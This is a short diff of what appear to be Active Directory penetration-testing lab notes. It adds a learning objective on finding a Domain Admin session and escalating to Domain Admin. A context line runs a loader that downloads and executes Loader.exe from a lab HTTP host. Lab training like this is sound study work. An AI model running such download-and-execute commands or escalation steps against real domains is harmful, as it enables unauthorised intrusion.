@@ -653,3 +653,11 @@ $ C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://
 ```
 
 
+# **Learning Objective 7**
+
+
+- Identify a machine in the target domain where a Domain Admin session is available.
+- Compromise the machine and escalate privileges to Domain Admin
+	- Using access to `dcorp-ci`
+	- Using derivative local admin
+
